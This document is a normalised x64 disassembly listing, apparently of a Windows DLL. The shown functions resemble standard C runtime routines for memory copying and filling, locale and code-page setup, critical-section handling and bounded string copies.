lea rax [ rbp + 0x54 ]
mov r9d 0x56
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
mov r9d 0x57
or ebx eax
lea rax [ rbp + 0x55 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
mov r9d 0x52
or ebx eax
lea rax [ rbp + 0x56 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
mov r9d 0x53
or ebx eax
lea rax [ rbp + 0x57 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
or eax ebx
je r-xdata
mov rcx rbp
call sub_18000e06c
mov rcx r13
jmp r-xdata
mov [ rsi + 0x120 ] r12
mov [ rsi + 0x110 ] r13
mov [ rsi + 0x128 ] rbp
xor eax eax
[ rcx ] 0xffffffff
jne r-xdata
mov rdx [ r14 ]
jmp r-xdata
mov rcx rbp
call sub_180015848
mov rcx rbp
call sub_18000e06c
mov rcx r13
call sub_18000e06c
mov rcx r12
jmp r-xdata
call sub_18000e06c
jmp r-xdata
mov rcx [ rsi + 0x128 ]
call sub_18000e06c
mov rcx [ rsi + 0x110 ]
call sub_18000e06c
cmp [ rdx ] 0x0
jne r-xdata
mov al [ rdx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov rax [ rsi + 0x128 ]
mov rcx [ rax ]
mov [ rbp ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x8 ]
mov [ rbp + 0x8 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x10 ]
mov [ rbp + 0x10 ] rcx
mov [ r13 ] 0x1
test r12 r12
je r-xdata
inc rdx
mov r8 rdx
sub al 0x30
mov [ rdx ] al
mov al [ r8 + 0x1 ]
mov [ r8 ] al
inc r8
cmp al 0x0
jne r-xdata
jmp r-xdata
sub_180015ca0
mov r11 rsp
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x90
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
xor ebx ebx
mov rdi rcx
mov [ r11 - 0x58 ] rcx
mov [ rsp + 0x58 ] rbx
mov r13 rbx
mov r15 rbx
mov r14 rbx
mov r12 rbx
mov [ r11 - 0x50 ] rbx
cmp [ rcx + 0x14 ] ebx
je r-xdata
mov rax [ rcx + 0x130 ]
cmp rax rbx
je r-xdata
lea rbp [ rcx + 0x4 ]
lea esi [ rbx + 0x1 ]
cmp [ rbp ] ebx
jne r-xdata
lea rax [ r--data ]
mov esi 0x1
mov [ rcx + 0x130 ] rbx
mov [ rcx + 0x140 ] rax
lea rax [ r--data ]
mov [ rcx + 0x138 ] rbx
mov [ rcx + 0x148 ] rax
lea rax [ r--data ]
mov [ rcx + 0x10c ] esi
mov [ rcx + 0x150 ] rax
xor eax eax
[ rax ] 0xffffffff
mov ecx 0x4
call sub_1800114a4
mov r12d 0x180
mov edx 0x2
mov rcx r12
mov [ rsp + 0x58 ] rax
call sub_180011510
mov rdx rsi
mov rcx r12
mov r13 rax
call sub_180011510
mov rdx rsi
mov rcx r12
mov r15 rax
call sub_180011510
lea ecx [ r12 - 0x7f ]
mov rdx rsi
mov r14 rax
call sub_180011510
mov r12 rax
mov rax [ rsp + 0x58 ]
cmp rax rbx
je r-xdata
movzx r8d [ rcx + 0x30 ]
lea rcx [ r11 - 0x58 ]
xor edx edx
mov r9d 0x1004
mov [ rsp + 0x20 ] rbp
call sub_180019a40
cmp eax ebx
jne r-xdata
mov rcx [ rsp + 0x58 ]
call sub_18000e06c
mov rcx r13
call sub_18000e06c
mov rcx r15
call sub_18000e06c
mov rcx r14
call sub_18000e06c
mov ebx esi
cmp r13 rbx
je r-xdata
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_180017570
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp r12 rbx
je r-xdata
cmp r15 rbx
je r-xdata
cmp r14 rbx
je r-xdata
mov [ rax ] ebx
mov rcx r12
mov eax ebx
mov [ rcx ] al
add eax esi
add rcx rsi
cmp eax 0x100
jl r-xdata
mov ecx [ rbp ]
lea rdx [ rsp + 0x70 ]
call [ GetCPInfo@IAT ]
cmp eax ebx
je r-xdata
cmp [ rsp + 0x70 ] 0x5
ja r-xdata
movzx eax [ rsp + 0x70 ]
cmp eax esi
mov [ rsp + 0x50 ] eax
jle r-xdata
mov eax [ rbp ]
mov [ rsp + 0x38 ] ebx
lea rcx [ r13 + 0x100 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rcx
xor ecx ecx
mov r9d 0x100
mov r8 r12
mov edx esi
call sub_1800178d4
cmp eax ebx
je r-xdata
cmp [ rsp + 0x76 ] bl
je r-xdata
mov eax [ rbp ]
mov edx [ rdi + 0x14 ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
mov eax 0xff
lea rcx [ r15 + 0x81 ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rcx
lea r8d [ rax + 0x1 ]
lea r9 [ r12 + 0x1 ]
xor ecx ecx
mov [ rsp + 0x20 ] eax
call sub_18001a690
cmp eax ebx
je r-xdata
lea rcx [ rsp + 0x77 ]
mov eax [ rbp ]
mov edx [ rdi + 0x14 ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
mov eax 0xff
lea rcx [ r14 + 0x81 ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rcx
lea r9 [ r12 + 0x1 ]
xor ecx ecx
mov r8d 0x200
mov [ rsp + 0x20 ] eax
call sub_18001a690
cmp eax ebx
je r-xdata
movzx edx [ rcx - 0x1 ]
jmp r-xdata
cmp [ rsp + 0x50 ] esi
lea rbp [ r13 + 0xfe ]
mov [ rbp ] bx
mov [ r15 + 0x7f ] bl
mov [ r14 + 0x7f ] bl
mov [ r15 + 0x80 ] bl
mov [ r14 + 0x80 ] bl
jle r-xdata
movzx eax [ rcx ]
cmp edx eax
jle r-xdata
lea rdx [ r13 + 0x200 ]
mov r8d 0xfe
mov rcx r13
call sub_1800160e0
lea rdx [ r15 + 0x100 ]
mov r8d 0x7f
mov rcx r15
call sub_1800160e0
lea rdx [ r14 + 0x100 ]
mov r8d 0x7f
mov rcx r14
call sub_1800160e0
mov rcx [ rdi + 0x130 ]
cmp rcx rbx
je r-xdata
cmp [ rsp + 0x76 ] bl
je r-xdata
movsxd rax edx
add edx esi
mov [ rax + r12 ] 0x20
add rcx 0x2
cmp [ rcx - 0x1 ] bl
jne r-xdata
mov rax [ rsp + 0x58 ]
mov [ rax ] esi
mov [ rdi + 0x130 ] rax
lea rax [ r13 + 0x100 ]
mov [ rdi + 0x140 ] rax
lea rax [ r15 + 0x80 ]
mov [ rdi + 0x138 ] rbp
mov [ rdi + 0x148 ] rax
lea rax [ r14 + 0x80 ]
mov [ rdi + 0x150 ] rax
mov eax [ rsp + 0x50 ]
mov [ rdi + 0x10c ] eax
jmp r-xdata
[ rcx ] 0xffffffff
jne r-xdata
lea rcx [ rsp + 0x77 ]
cmp [ rcx ] bl
je r-xdata
mov rcx r12
call sub_18000e06c
mov eax ebx
jmp r-xdata
mov rcx [ rdi + 0x138 ]
sub rcx 0xfe
call sub_18000e06c
mov rcx [ rdi + 0x148 ]
add rcx 0xffffffffffffff80
call sub_18000e06c
mov rcx [ rdi + 0x150 ]
add rcx 0xffffffffffffff80
call sub_18000e06c
mov rcx [ rdi + 0x130 ]
call sub_18000e06c
movzx edx [ rcx - 0x1 ]
jmp r-xdata
movzx eax [ rcx ]
cmp edx eax
jle r-xdata
movsxd rax edx
mov r8d 0x8000
add edx esi
mov [ r13 + rax * 2 + 0x100 ] r8w
add rcx 0x2
cmp [ rcx - 0x1 ] bl
jne r-xdata
cmp [ rcx ] bl
je r-xdata
sub_1800160e0
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_180016414
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor edi edi
mov rbx r12
lea rax [ rw-data ]
add rbx 0x10
inc edi
cmp rbx rax
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rbx ] rcx
call sub_180019c14
test eax eax
je r-xdata
cmp [ rbx + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax edi
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_1800164a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
lea rbp [ rw-data ]
mov rdi rbx
add rdi 0x10
cmp rdi rbp
jl r-xdata
cmp [ rdi + 0x8 ] 0x1
je r-xdata
mov rsi [ rdi ]
test rsi rsi
je r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx rsi
call [ DeleteCriticalSection@IAT ]
mov rcx rsi
call sub_18000e06c
and [ rdi ] 0x0
add rbx 0x10
cmp rbx rbp
jl r-xdata
cmp [ rbx + 0x8 ] 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_18001653c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_180014cf4
lea ecx [ rsi + 0x1d ]
call sub_180014acc
mov ecx 0xff
call sub_180011144
mov ecx 0x28
call sub_1800114a4
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_180016624
nop
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_180010834
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
mov rcx rbx
call sub_18000e06c
nop
mov edx 0xfa0
mov rcx rbx
call sub_180019c14
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_18000e06c
call sub_180010834
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax esi
sub_180016624
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_18001653c
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_1800110d8
sub_180016668
push rbx
sub rsp 0x30
mov r9 rcx
test rcx rcx
je r-xdata
call sub_180010834
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
inc rcx
sub rdx 0x1
jne r-xdata
mov al [ r8 ]
inc r8
mov [ rcx ] al
inc rcx
test al al
je r-xdata
mov [ r9 ] dl
jmp r-xdata
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] dl
call sub_180010834
mov ebx 0x22
jmp r-xdata
add rsp 0x30
pop rbx
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
mov eax ebx
sub_1800166f4
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x20 ] rax
mov al [ rdx ]
xor r9d r9d
mov r11 rdx
mov [ rsp ] r9
mov [ rsp + 0x8 ] r9
mov [ rsp + 0x10 ] r9
mov [ rsp + 0x18 ] r9
mov r10 rcx
jmp r-xdata
mov edx 0x1
cmp al r9b
jne r-xdata
movzx r8d al
movzx eax al
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 ] dl
inc r11
mov al [ r11 ]
or [ rsp ] dl
jmp r-xdata
movzx r8d [ r10 ]
mov ecx r8d
shr r8 0x3
and ecx 0x7
shl edx cl
test [ rsp + r8 ] dl
je r-xdata
inc r9d
mov edx 0x1
inc r10
movsxd rax r9d
mov rcx [ rsp + 0x20 ]
xor rcx rsp
call sub_180017570
add rsp 0x38
retn
sub_180016788
push rbx
sub rsp 0x30
mov r11 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_180010834
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] r9b
jmp r-xdata
add rsp 0x30
pop rbx
retn
mov r10 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] r8b
mov al [ r11 ]
inc r11
mov [ r10 ] al
inc r10
test al al
je r-xdata
mov al [ r11 ]
inc r11
mov [ r10 ] al
inc r10
test al al
je r-xdata
test r9 r9
jne r-xdata
sub r8 0x1
je r-xdata
test r8 r8
jne r-xdata
sub r8 0x1
jne r-xdata
mov [ r10 ] r9b
sub r9 0x1
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
jmp r-xdata
mov [ rcx ] 0x0
call sub_180010834
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx - 0x1 ] r8b
lea eax [ r8 + 0x50 ]
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
mov eax ebx
sub_180016870
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_18001695c
push rbx
sub rsp 0x30
test rcx rcx
je r-xdata
call sub_180010834
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_180010834
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
inc r8
mov [ r9 ] al
inc r9
test al al
je r-xdata
add rsp 0x30
pop rbx
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
mov eax ebx
sub_1800169d0
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_180017570
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_180016a54
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
xor ebx ebx
mov r13 r8
mov edi edx
cmp edx ebx
mov r14 rcx
mov eax 0x1
mov esi ebx
jl r-xdata
cmp eax ebx
cmp eax ebx
je r-xdata
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
sete bl
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov rcx [ r13 ]
lea eax [ rsi + rdi ]
cdq
sub eax edx
sar eax 0x1
movsxd rbp eax
mov r12 rbp
add r12 r12
mov rdx [ r14 + r12 * 8 ]
call sub_18001b6ec
cmp eax ebx
jne r-xdata
jge r-xdata
lea rcx [ r14 + r12 * 8 + 0x8 ]
mov [ r13 ] rcx
jmp r-xdata
lea esi [ rbp + 0x1 ]
lea edi [ rbp - 0x1 ]
jmp r-xdata
cmp esi edi
jle r-xdata
sub_180016aec
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x30
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x28 ] rax
mov rdi rdx
mov rbx rcx
test rcx rcx
je r-xdata
mov ecx [ rdi + 0x24 ]
lea r8 [ rsp + 0x20 ]
mov r9d 0x8
mov edx 0x1004
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ rcx ] 0x0
je r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_1800132b0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea rdx [ r--data ]
call sub_1800132b0
test eax eax
je r-xdata
lea rbx [ rsp + 0x20 ]
call [ GetACP@IAT ]
jmp r-xdata
mov rcx [ rsp + 0x28 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
lea rdx [ r--data ]
mov rcx rbx
call sub_1800132b0
test eax eax
jne r-xdata
mov rcx rbx
call sub_18001b740
mov ecx [ rdi + 0x24 ]
lea r9d [ rax + 0x8 ]
lea r8 [ rsp + 0x20 ]
lea edx [ rax + 0xb ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_180016bb4
mov dl [ rcx ]
mov r8 rcx
xor r9d r9d
jmp r-xdata
test dl dl
jne r-xdata
lea eax [ rdx - 0x61 ]
inc r8
cmp al 0x5
ja r-xdata
mov eax r9d
retn
lea eax [ rdx - 0x41 ]
cmp al 0x5
ja r-xdata
add dl 0xd9
jmp r-xdata
movsx ecx dl
mov dl [ r8 ]
add r9d r9d
lea r9d [ rcx + r9 * 8 - 0x30 ]
add dl 0xf9
sub_180016bf0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov rbx rcx
call sub_180010a54
mov rcx rbx
mov rdi rax
call sub_180016bb4
mov ecx [ rdi + 0x15c ]
neg ecx
lea r8 [ rsp + 0x20 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov esi eax
and edx 0xfffff005
add edx 0x1002
call [ GetLocaleInfoA@IAT ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov rcx [ rdi + 0x148 ]
lea rdx [ rsp + 0x20 ]
call sub_18001b6ec
cmp eax ebx
jne r-xdata
mov [ rdi + 0x150 ] ebx
lea eax [ rbx + 0x1 ]
jmp r-xdata
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
lea rax [ r--data ]
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180017570
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
inc ebx
add rax 0x2
cmp ebx 0xa
jb r-xdata
cmp si [ rax ]
je r-xdata
or [ rdi + 0x150 ] 0x4
mov [ rdi + 0x164 ] esi
mov [ rdi + 0x160 ] esi
sub_180016cd8
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov esi ecx
mov r9d 0x78
and ecx 0x3ff
mov rbp r8
mov edi edx
lea edx [ r9 - 0x77 ]
lea r8 [ rsp + 0x20 ]
bts ecx 0xa
call [ GetLocaleInfoA@IAT ]
xor ebx ebx
cmp eax ebx
jne r-xdata
lea rcx [ rsp + 0x20 ]
call sub_180016bb4
cmp esi eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
cmp edi ebx
je r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0xd8 ]
add rsp 0xb0
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbp ]
sub al 0x61
cmp al 0x19
ja r-xdata
cmp al 0x5a
jle r-xdata
mov rcx [ rbp ]
call sub_1800174b0
cmp ebx eax
je r-xdata
inc ebx
jmp r-xdata
mov al [ rcx ]
inc rcx
cmp al 0x41
jl r-xdata
sub_180016d8c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov rbx rcx
call sub_180010a54
mov rcx rbx
mov rdi rax
call sub_180016bb4
mov ecx [ rdi + 0x15c ]
neg ecx
lea r8 [ rsp + 0x20 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov ebx eax
and edx 0xfffff005
add edx 0x1002
call [ GetLocaleInfoA@IAT ]
xor ebp ebp
cmp eax ebp
jne r-xdata
mov rcx [ rdi + 0x148 ]
lea rdx [ rsp + 0x20 ]
call sub_18001b6ec
cmp eax ebp
jne r-xdata
mov [ rdi + 0x150 ] ebp
mov eax 0x1
jmp r-xdata
mov eax [ rdi + 0x150 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
mov eax [ rdi + 0x158 ]
lea r8 [ rsp + 0x20 ]
mov r9d 0x78
neg eax
mov ecx ebx
sbb edx edx
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
cmp eax ebp
je r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180017570
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
mov eax [ rdi + 0x158 ]
lea r8 [ rsp + 0x20 ]
mov r9d 0x78
neg eax
mov ecx ebx
sbb edx edx
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
cmp eax ebp
je r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x20 ]
call sub_18001b6ec
cmp eax ebp
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x20 ]
call sub_18001b6ec
cmp eax ebp
jne r-xdata
test [ rdi + 0x150 ] 0x2
jne r-xdata
or [ rdi + 0x150 ] 0x304
mov [ rdi + 0x160 ] ebx
jmp r-xdata
cmp [ rdi + 0x158 ] ebp
jne r-xdata
bts [ rdi + 0x150 ] 0x9
mov eax [ rdi + 0x150 ]
cmp [ rdi + 0x158 ] ebp
je r-xdata
cmp [ rdi + 0x154 ] ebp
je r-xdata
mov [ rdi + 0x164 ] ebx
cmp [ rdi + 0x154 ] ebp
je r-xdata
cmp [ rdi + 0x154 ] ebp
je r-xdata
